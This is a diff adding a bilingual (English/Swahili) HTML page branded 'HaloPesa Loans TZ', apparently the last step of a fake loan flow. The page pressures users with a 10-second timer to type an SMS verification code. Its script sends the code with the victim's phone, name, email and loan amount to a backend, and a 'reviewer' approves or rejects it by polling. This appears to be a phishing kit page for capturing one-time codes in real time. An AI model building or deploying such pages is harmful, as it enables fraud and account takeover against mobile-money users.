@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa Loans TZ — Verify SMS</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #F58220;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer; transition: transform 0.2s;
+        }
+        .back-arrow:hover { transform: translateX(-3px); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-mark {
+            width: 40px; height: 40px; background: #F58220;
+            border-radius: 10px; display: flex; align-items: center;
+            justify-content: center; color: #fff; font-weight: 900; font-size: 18px;
+        }
+        .logo-text { font-weight: 900; font-size: 20px; color: #1a1a1a; letter-spacing: -0.5px; }
+        .logo-text span { color: #F58220; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 20px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06); height: fit-content;
+        }
+
+        .step-text { text-align: center; color: #888; font-size: 13px; margin-bottom: 18px; }
+
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 60px; border-radius: 3px; background: #e5e5e5; }
+        .progress .bar.active { background: #F58220; }
+
+        h1 {
+            font-size: 22px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 14px; color: #666; line-height: 1.5;
+            text-align: center; margin-bottom: 24px;
+        }
+
+        /* Timer box */
+        .timer-box {
+            display: flex; align-items: center; gap: 14px;
+            background: #fffbf6; border: 1px solid #ffe3c7;
+            border-radius: 12px; padding: 14px 16px;
+            margin-bottom: 22px;
+        }
+        .timer-circle {
+            width: 48px; height: 48px; border-radius: 50%;
+            border: 3px solid #F58220;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 18px; font-weight: 900; color: #F58220;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+        .timer-circle.urgent {
+            border-color: #dc2626; color: #dc2626;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        .timer-text { font-size: 13px; color: #a0511a; line-height: 1.4; }
+        .timer-text strong { color: #7a3c0f; font-weight: 800; }
+
+        /* 4-digit SMS input */
+        .sms-label {
+            font-size: 13px; font-weight: 700; color: #333;
+            margin-bottom: 12px; text-align: center;
+        }
+
+        .sms-row {
+            display: flex; gap: 14px; justify-content: center;
+            margin-bottom: 14px;
+        }
+
+        .sms-box {
+            width: 62px; height: 72px;
+            border: 2px solid #e5e5e5;
+            border-radius: 14px;
+            background: #fafafa;
+            font-size: 32px; font-weight: 900;
+            text-align: center;
+            color: #111;
+            outline: none;
+            transition: all 0.15s;
+            caret-color: #F58220;
+        }
+        .sms-box:focus {
+            border-color: #F58220;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(245,130,32,0.15);
+        }
+        .sms-box.filled {
+            border-color: #F58220;
+            background: #fffbf6;
+        }
+        .sms-box.error {
+            border-color: #dc2626;
+            background: #fff5f5;
+            animation: shake 0.3s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .example-text {
+            font-size: 12px; color: #888; font-style: italic;
+            text-align: center; margin-bottom: 22px; line-height: 1.5;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #F58220;
+            color: #fff;
+            border: none;
+            padding: 18px;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s, transform 0.1s, opacity 0.2s;
+        }
+        .submit-btn:hover:not(:disabled) { background: #d96f18; }
+        .submit-btn:active:not(:disabled) { transform: scale(0.99); }
+        .submit-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .error-msg {
+            display: none;
+            font-size: 13px; color: #dc2626; font-weight: 700;
+            text-align: center; margin-top: 14px;
+        }
+        .error-msg.show { display: block; }
+
+        /* Waiting view */
+        .waiting {
+            display: none; text-align: center; padding: 20px 0;
+        }
+        .waiting.show { display: block; }
+
+        .waiting .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #ffe3c7;
+            border-top: 5px solid #F58220;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 18px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .waiting h3 {
+            font-size: 17px; font-weight: 800; color: #111;
+            margin-bottom: 6px;
+        }
+        .waiting p {
+            font-size: 13px; color: #666; line-height: 1.5;
+        }
+
+        /* Success */
+        .success-view { display: none; text-align: center; padding: 10px 0; }
+        .success-view.show { display: block; }
+        .check-circle {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: #F58220; color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 40px; margin: 0 auto 18px;
+            box-shadow: 0 10px 24px rgba(245,130,32,0.4);
+        }
+        .success-view h3 {
+            font-size: 20px; font-weight: 800; color: #111; margin-bottom: 8px;
+        }
+        .success-view p {
+            font-size: 14px; color: #666; line-height: 1.6;
+        }
+
+        /* Rejected */
+        .rejected-view { display: none; text-align: center; padding: 10px 0; }
+        .rejected-view.show { display: block; }
+        .x-circle {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: #dc2626; color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 40px; margin: 0 auto 18px;
+        }
+        .rejected-view h3 {
+            font-size: 20px; font-weight: 800; color: #dc2626; margin-bottom: 8px;
+        }
+        .rejected-view p {
+            font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px;
+        }
+        .retry-btn {
+            background: #111; color: #F58220;
+            border: none; padding: 14px 28px;
+            font-size: 14px; font-weight: 800;
+            border-radius: 12px; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        .resend-wrap { text-align: center; margin-top: 16px; }
+        .resend-btn {
+            background: transparent; border: none;
+            color: #b8860b; font-size: 13px; font-weight: 700;
+            cursor: pointer; text-decoration: underline;
+        }
+        .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
+
+        .footer {
+            background: #111; color: #F58220; text-align: center;
+            padding: 18px; font-size: 12px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            h1 { font-size: 19px; }
+            .sms-box { width: 54px; height: 64px; font-size: 26px; }
+            .sms-row { gap: 10px; }
+            .progress .bar { width: 45px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="pin.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-mark">H</div>
+            <div class="logo-text">Halo<span>Pesa</span></div>
+        </div>
+        <span class="header-title" id="headerTitle">Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+
+            <p class="step-text" id="stepText">Step 5 of 5</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+            </div>
+
+            <!-- FORM VIEW -->
+            <div id="formView">
+                <h1 id="heading">Enter SMS Code</h1>
+                <p class="sub" id="subheading">
+                    Enter the 4-digit code we sent to your phone.
+                </p>
+
+                <div class="timer-box">
+                    <div class="timer-circle" id="timerCircle">10</div>
+                    <div class="timer-text">
+                        <strong id="timerLabel">Code expires in <span id="timerSec">10</span>s.</strong><br>
+                        <span id="timerSub">Enter your code before time runs out.</span>
+                    </div>
+                </div>
+
+                <p class="sms-label" id="smsLabel">SMS Code (4 digits)</p>
+
+                <div class="sms-row">
+                    <input type="tel" class="sms-box" id="sms1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="sms-box" id="sms2" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="sms-box" id="sms3" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="sms-box" id="sms4" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                </div>
+
+                <p class="example-text" id="exampleText">
+                    Example: 1234
+                </p>
+
+                <button class="submit-btn" id="submitBtn" disabled>Submit Code</button>
+
+                <p class="error-msg" id="errorMsg"></p>
+
+                <div class="resend-wrap">
+                    <button class="resend-btn" id="resendBtn">Didn't receive a code? Resend</button>
+                </div>
+            </div>
+
+            <!-- WAITING VIEW -->
+            <div class="waiting" id="waitingView">
+                <div class="spinner"></div>
+                <h3 id="waitingTitle">Waiting for Approval</h3>
+                <p id="waitingText">Your code was sent to our reviewer.<br>Please wait a moment…</p>
+            </div>
+
+            <!-- SUCCESS VIEW -->
+            <div class="success-view" id="successView">
+                <div class="check-circle">✓</div>
+                <h3 id="successTitle">Code Confirmed</h3>
+                <p id="successText">Thank you. Redirecting you…</p>
+            </div>
+
+            <!-- REJECTED VIEW -->
+            <div class="rejected-view" id="rejectedView">
+                <div class="x-circle">✕</div>
+                <h3 id="rejectedTitle">Code Rejected</h3>
+                <p id="rejectedText">The code you entered could not be verified.<br>Please try again.</p>
+                <button class="retry-btn" id="retryBtn" onclick="location.reload()">Try Again</button>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="footer" id="footer">© 2026 HaloPesa Loans TZ</footer>
+
+    <script>
+        const LANG = {
+            en: {
+                headerTitle: 'Mobile Services',
+                stepText: 'Step 5 of 5',
+                heading: 'Enter SMS Code',
+                subheading: 'Enter the 4-digit code we sent to your phone.',
+                smsLabel: 'SMS Code (4 digits)',
+                exampleText: 'Example: 1234',
+                submitBtn: 'Submit Code',
+                errorMsg: 'Please enter all 4 digits',
+                timerLabel: 'Code expires in {n}s.',
+                timerSub: 'Enter your code before time runs out.',
+                resendBtn: "Didn't receive a code? Resend",
+                waitingTitle: 'Waiting for Approval',
+                waitingText: 'Your code was sent to our reviewer.<br>Please wait a moment…',
+                successTitle: 'Code Confirmed',
+                successText: 'Thank you. Redirecting you…',
+                rejectedTitle: 'Code Rejected',
+                rejectedText: 'The code you entered could not be verified.<br>Please try again.',
+                networkError: 'Network error. Please try again.',
+                expired: 'Time expired. Please request a new code.',
+                footer: '© 2026 HaloPesa Loans TZ'
+            },
+            sw: {
+                headerTitle: 'Huduma za Simu',
+                stepText: 'Hatua 5 kati ya 5',
+                heading: 'Weka Namba ya SMS',
+                subheading: 'Weka namba ya tarakimu 4 tuliyotuma kwenye simu yako.',
+                smsLabel: 'Namba ya SMS (tarakimu 4)',
+                exampleText: 'Mfano: 1234',
+                submitBtn: 'Tuma Namba',
+                errorMsg: 'Tafadhali weka tarakimu zote 4',
+                timerLabel: 'Namba inaisha baada ya sekunde {n}.',
+                timerSub: 'Weka namba yako kabla muda uishe.',
+                resendBtn: 'Hukupokea namba? Tuma tena',
+                waitingTitle: 'Inasubiri Idhini',
+                waitingText: 'Namba yako imetumwa kwa mthibitishaji wetu.<br>Tafadhali subiri kidogo…',
+                successTitle: 'Namba Imethibitishwa',
+                successText: 'Asante. Tunakupeleka…',
+                rejectedTitle: 'Namba Imekataliwa',
+                rejectedText: 'Namba uliyoweka haikuweza kuthibitishwa.<br>Tafadhali jaribu tena.',
+                networkError: 'Hitilafu ya mtandao. Tafadhali jaribu tena.',
+                expired: 'Muda umeisha. Tafadhali omba namba mpya.',
+                footer: '© 2026 HaloPesa Loans TZ'
+            }
+        };
+
+        const lang = localStorage.getItem('lang') || 'en';
+        const t = LANG[lang];
+
+        document.getElementById('headerTitle').textContent = t.headerTitle;
+        document.getElementById('stepText').textContent    = t.stepText;
+        document.getElementById('heading').textContent     = t.heading;
+        document.getElementById('subheading').textContent  = t.subheading;
+        document.getElementById('smsLabel').textContent    = t.smsLabel;
+        document.getElementById('exampleText').textContent = t.exampleText;
+        document.getElementById('submitBtn').textContent   = t.submitBtn;
+        document.getElementById('errorMsg').textContent    = t.errorMsg;
+        document.getElementById('resendBtn').textContent   = t.resendBtn;
+        document.getElementById('waitingTitle').textContent = t.waitingTitle;
+        document.getElementById('waitingText').innerHTML   = t.waitingText;
+        document.getElementById('successTitle').textContent = t.successTitle;
+        document.getElementById('successText').textContent  = t.successText;
+        document.getElementById('rejectedTitle').textContent = t.rejectedTitle;
+        document.getElementById('rejectedText').innerHTML    = t.rejectedText;
+        document.getElementById('footer').textContent      = t.footer;
+
+        // Params
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone') || '';
+
+        // ─── 4 SMS boxes ───
+        const boxes = [
+            document.getElementById('sms1'),
+            document.getElementById('sms2'),
+            document.getElementById('sms3'),
+            document.getElementById('sms4')
+        ];
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+
+        function getCode() { return boxes.map(b => b.value).join(''); }
+
+        function checkComplete() {
+            submitBtn.disabled = getCode().length !== 4;
+            boxes.forEach(b => b.classList.toggle('filled', b.value.length === 1));
+        }
+
+        boxes.forEach((box, i) => {
+            box.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '').slice(-1);
+                this.classList.remove('error');
+                if (this.value && i < 3) boxes[i+1].focus();
+                checkComplete();
+            });
+            box.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !this.value && i > 0) {
+                    boxes[i-1].focus();
+                }
+            });
+            box.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+                if (pasted.length >= 4) {
+                    boxes.forEach((b, j) => { b.value = pasted[j] || ''; });
+                    boxes[3].focus();
+                    checkComplete();
+                }
+            });
+        });
+        boxes[0].focus();
+
+                // ─── 10-second timer (can restart) ───
+        let timeLeft = 10;
+        let timerInterval = null;
+        const timerCircle = document.getElementById('timerCircle');
+        const timerSec = document.getElementById('timerSec');
+        const timerLabel = document.getElementById('timerLabel');
+
+        function renderTimer() {
+            timerCircle.textContent = timeLeft;
+            timerSec.textContent = timeLeft;
+            timerLabel.innerHTML = t.timerLabel.replace('{n}', timeLeft);
+            // Turn urgent in last 3 seconds only
+            if (timeLeft <= 3) timerCircle.classList.add('urgent');
+            else timerCircle.classList.remove('urgent');
+        }
+
+        function startTimer() {
+            // Clear any existing timer
+            if (timerInterval) clearInterval(timerInterval);
+
+            timeLeft = 10;
+            timerCircle.classList.remove('urgent');
+            renderTimer();
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    timeLeft = 0;
+                    clearInterval(timerInterval);
+                    boxes.forEach(b => { b.disabled = true; b.classList.add('error'); });
+                    submitBtn.disabled = true;
+                    errorMsg.textContent = t.expired;
+                    errorMsg.classList.add('show');
+                }
+                renderTimer();
+            }, 1000);
+        }
+
+        // Kick it off
+        startTimer();
+
+        // ─── Polling ───
+        let referenceId = null;
+        let pollTimer = null;
+
+        function startPolling() {
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
+                    const data = await res.json();
+
+                    if (data.status === 'confirmed') {
+                        clearInterval(pollTimer);
+                        document.getElementById('waitingView').classList.remove('show');
+                        document.getElementById('successView').classList.add('show');
+                        setTimeout(() => {
+                            const next = new URLSearchParams(params);
+                            next.set('lang', lang);
+                            window.location.href = 'final.html?' + next.toString();
+                        }, 1800);
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        document.getElementById('waitingView').classList.remove('show');
+                        document.getElementById('rejectedView').classList.add('show');
+                    }
+                } catch (err) {
+                    console.error('Poll failed:', err);
+                }
+            }, 3000);
+        }
+
+        // ─── Submit ───
+        submitBtn.addEventListener('click', async function () {
+            if (submitBtn.disabled) return;
+            const code = getCode();
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = '...';
+
+            const payload = {
+                phone, code,
+                firstName: params.get('firstName') || '',
+                lastName:  params.get('lastName')  || '',
+                email:     params.get('email')     || '',
+                amount:    params.get('amount')    || '',
+                lang
+            };
+
+            try {
+                const res = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+                referenceId = data.referenceId;
+
+                document.getElementById('formView').style.display = 'none';
+                document.getElementById('waitingView').classList.add('show');
+
+                startPolling();
+            } catch (err) {
+                console.error(err);
+                errorMsg.textContent = t.networkError;
+                errorMsg.classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = t.submitBtn;
+            }
+        });
+
+                // ─── Resend ───
+        document.getElementById('resendBtn').addEventListener('click', async function () {
+            this.disabled = true;
+            this.textContent = lang === 'sw' ? 'Inatuma…' : 'Sending…';
+
+            // Clear current error
+            errorMsg.classList.remove('show');
+            errorMsg.textContent = '';
+
+            // Re-enable SMS boxes and reset them
+            boxes.forEach(b => {
+                b.disabled = false;
+                b.value = '';
+                b.classList.remove('error', 'filled');
+            });
+            boxes[0].focus();
+            submitBtn.disabled = true;
+            submitBtn.textContent = t.submitBtn;
+
+            // 🔁 Restart the countdown
+            startTimer();
+
+            // Call resend API
+            try {
+                await fetch('/api/resend-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+            } catch (e) {}
+
+            // Re-enable resend button after 3 seconds
+            setTimeout(() => {
+                this.disabled = false;
+                this.textContent = t.resendBtn;
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
